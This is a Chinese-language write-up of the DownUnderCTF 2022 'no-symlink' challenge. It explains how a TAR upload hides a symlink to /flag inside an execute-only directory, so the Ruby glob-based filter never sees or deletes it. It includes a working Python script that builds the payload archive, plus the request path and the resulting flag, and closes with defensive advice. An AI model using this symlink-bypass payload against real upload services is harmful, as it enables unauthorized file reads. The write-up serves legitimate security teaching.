# DownUnderCTF 2022 no-symlink Writeup

## 题目简述

网站解压用户上传的 TAR 文件，递归枚举结果，发现符号链接后立即删除；普通文件则生成下载链接。flag 位于 `/flag`。过滤逻辑表面上覆盖了符号链接，但目录遍历与后续按路径下载使用了不同的访问方式，可以用不可读目录藏住链接。

## 解题过程

解压后程序执行：

```ruby
Dir.glob("uploads/#{path}/**/*", File::FNM_DOTMATCH).select do |f|
  if File.symlink? f
    File.unlink f
    false
  elsif File.directory? f
    false
  else
    true
  end
end
```

若目录只有执行权限而没有读取权限，应用用户可以在已知文件名时穿过目录，却不能列出目录内容。`Dir.glob` 因而看不到里面的符号链接，也就不会删除它。TAR 中再放一个普通文件，用于让响应泄露随机上传目录名。

可以构造如下内容：

```text
-rw-r--r--  foo.txt
d--x------  x/
lrwxrwxrwx  x/flag_symlink -> /flag
```

对应的 Python 生成代码为：

```python
import io
import tarfile

with tarfile.open('payload.tar', 'w') as tar:
    decoy = tarfile.TarInfo('foo.txt')
    decoy.size = 1
    decoy.mode = 0o644
    tar.addfile(decoy, io.BytesIO(b'x'))

    hidden = tarfile.TarInfo('x')
    hidden.type = tarfile.DIRTYPE
    hidden.mode = 0o100
    tar.addfile(hidden)

    link = tarfile.TarInfo('x/flag_symlink')
    link.type = tarfile.SYMTYPE
    link.linkname = '/flag'
    link.mode = 0o777
    tar.addfile(link)
```

上传后页面只列出类似 `/uploads/<随机值>/foo.txt` 的链接。保留其中的随机值，直接请求：

```text
/uploads/<随机值>/x/flag_symlink
```

下载路由调用 `File.file?` 和 `send_file`，两者都会跟随已知路径上的符号链接，于是返回 `/flag`：

```text
DUCTF{are_symlinks_really_worth_the_trouble_they_cause?????}
```

## 方法总结

漏洞来自“安全扫描可见集合”与“下载可达集合”不一致。递归 glob 需要目录读取权限才能发现条目，而访问一个已知子路径只需要目录执行权限；隐藏符号链接因此逃过删除，却仍能被下载接口跟随。防御时不能依赖先遍历后使用，应在打开文件时使用不跟随符号链接的原语，并验证最终解析路径仍位于上传根目录。
